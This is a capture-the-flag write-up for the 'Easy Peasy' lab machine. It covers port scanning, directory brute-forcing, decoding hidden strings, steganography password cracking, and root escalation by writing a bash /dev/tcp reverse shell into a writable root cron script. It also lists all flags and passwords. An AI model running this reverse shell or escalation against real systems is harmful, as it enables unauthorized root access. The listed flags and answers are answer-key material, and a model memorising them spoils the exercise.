# Easy Peasy

  - [Task 1](#task-1)
  - [Task 2](#task-2)

## Task 1

<i>First we should check how many ports are open. To do so we will use [nmap](https://nmap.org/). We will use the `-p-` flag to scan all ports.<br>
The full command looks like this: `nmap -p- -sV MACHINE_IP`<br>
This can take a long time but nmap returns us the following.</i>

<pre>
PORT      STATE SERVICE VERSION
<b>80/tcp</b>    open  http    nginx <b>1.16.1</b>
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
<b>6498/tcp</b>  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
<b>65524/tcp</b> open  http    <b>Apache</b> httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre>

1. How many ports are open?<br>
   `3`

<i>To detect the version of [nginx](https://nginx.org) we look at the output above.</i>

2. What is the version of nginx?<br>
   `1.16.1`

<i>The output above also entails the answer to the last question.</i>

3. What is running on the highest port?<br>
   `Apache`

## Task 2

<i>We can use [gobuster](https://github.com/OJ/gobuster) to search for hidden directories. By using the `-u` flag we can specify a url to attack. As a wordlist we will use the [`common.txt`](https://gitlab.com/kalilinux/packages/dirb/-/blob/kali/master/wordlists/common.txt).<br>
The command: `gobuster dir -u "http://MACHINE_IP" -w ./common.txt`</i>

<pre>
<b>/hidden</b> (Status: 301)
/index.html (Status: 200)
/robots.txt (Status: 200)
</pre>

<i>When visiting the `/hidden` directory there is only a picture and the source code also does not help us. But that cannot be the end. Let's continue the search and perform another gobuster search on the `/hidden` directory.<br>
The full command: `gobuster dir -u "http://MACHINE_IP/hidden" -w ./common.txt`</i>

<pre>
/index.html (Status: 200)
<b>/whatever</b> (Status: 301)
</pre>

<i>The `/whatever` directory looks interesting. By visiting the page there again is just a picture. But looking at the source code we can see a hidden p-tag with a `base64` looking string in it. Let's decode this string: `echo ZmxhZ3tmMXJzN19mbDRnfQ== | base64 -d`</i>

1. What is flag 1?<br>
   `flag{f1rs7_fl4g}`

<i>Now looking at the Apache server we can see the default page. We could make another gobuster scan to find maybe some interesting files or directories.<br>
The full command: `gobuster dir -u "http://MACHINE_IP:65524" -w ./common.txt`<br>
Gobuster returns nothing really special but let's look at the `robots.txt`. At the User-Agent field there is a string, looking like a `MD5` hash or somehting like that.</i>

<pre>
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
<b>/robots.txt</b> (Status: 200)
/server-status (Status: 403)
</pre>

<i>To crack the hash I tried many websites but all of them haven't worked for me. Except one: [md5hashing.net](https://md5hashing.net). I inserted the hash, waiting. And the website returned me the second flag.</i>

2. What is flag 2?<br>
   `flag{1m_s3c0nd_fl4g}`

<i>Looking back to the Apache default page source code we can see the third flag in plain text. If you cannot find the flag at once, just keep searching.</i>

3. What is flag 3?<br>
   `flag{9fdafbd64c47471a8f54cd3fc64cd312}`

<i>The next question tells us to search for another hidden diretory. But not so fast. When I looked at the default page I also found another message: `its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu`. Should that mean that the string is `base` encoded? Let's try to decode it. A great website to test something like this is [CyberChef](https://gchq.github.io/CyberChef). I tried every `from base...` and got a hit with `base62`.</i>

4. What is the hidden directory?<br>
   `/n0th1ng3ls3m4tt3r`

<i>When visiting the hidden directory we can see another picture, another hash in the source code. The picture looks interesting because it is not stored on pixabay like the other pictures before. And its name maybe should mislead us. Maybe there is a hidden file inside the picture. Let's download the picture by using `wget`.<br>
The command: `wget "http://MACHINE_IP:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg"`<br>
Now we can try [steghide](http://steghide.sourceforge.net) on this picture. With `-sf` we can set a file to extract from.<br>
The full command: `steghide extract -sf binarycodepixabay.jpg`<br>
But it prompts for a password which we don't have. Remember, there was this hash on the page and the room provides a wordlist. After downloading the wordlist we can start up [stegcracker](https://github.com/Paradoxis/StegCracker) to crack the password.<br>
The command: `stegcracker binarycodepixabay.jpg easypeasy.txt`</i>

<pre>
StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2020 - Luke Paris (Paradoxis)

Counting lines in wordlist..
Attacking file 'binarycodepixabay.jpg' with wordlist 'easypeasy.txt'..
Successfully cracked file with password: mypasswordforthatjob
Tried 3585 passwords
Your file has been written to: binarycodepixabay.jpg.out
<b>mypasswordforthatjob</b>
</pre>

5. What is the password from the hash?<br>
   `mypasswordforthatjob`

<i>We can `cat` out the `binarycodepixabay.jpg.out` and see the following.</i>

<pre>
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
</pre>

<i>A username and a password encoded in binary...interesting. On [RapidTables](https://www.rapidtables.com/convert/number/binary-to-ascii.html) we can easily paste the binary in and convert it to plain text.</i>

6. What is the password to login to the machine via SSH?<br>
   `iconvertedmypasswordtobinary`

<i>We have all credentials for an ssh login. After logging in we are in the home directory and can `cat` the `user.txt`.</i>

<pre>
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
</pre>

<i>The flag is 'rotated'. That means we should decode the flag with `ROT13`. I used an [online tool](https://gc.de/gc/rot13).</i>

7. What is the user flag?<br>
   `flag{n0wits33msn0rm4l}`

<i>Now we have to become root to read the root flag. Looking at the cronjobs with `cat /etc/cronjobs` shows a cronjob running as root.</i>

<pre>
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
<b>* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh</b>
</pre>

<i>When we look at the `.mysecretcronjob.sh` we have read and write permissions. That means we can execute commands as root. To get a reverse shell we can copy one from [pentestmonkey.net](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). Now we have to `nano .mysecretcronjob.sh` and paste in our reverse shell.</i>

<pre>
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/8080 0>&1
</pre>

<i>And we have to listen for a connection using `netcat -lnvp 8080`. It does not need much time and we get a connection and become root. we can `cd` into the `/root` diretory and `ls -a` list all files. There is a `.root.txt` file. Because we are root we can simply type `cat .root.txt` and get the final root flag.</i>

8. What is the root flag?<br>
   `flag{63a9f0ea7bb98050796b649e85481845}`
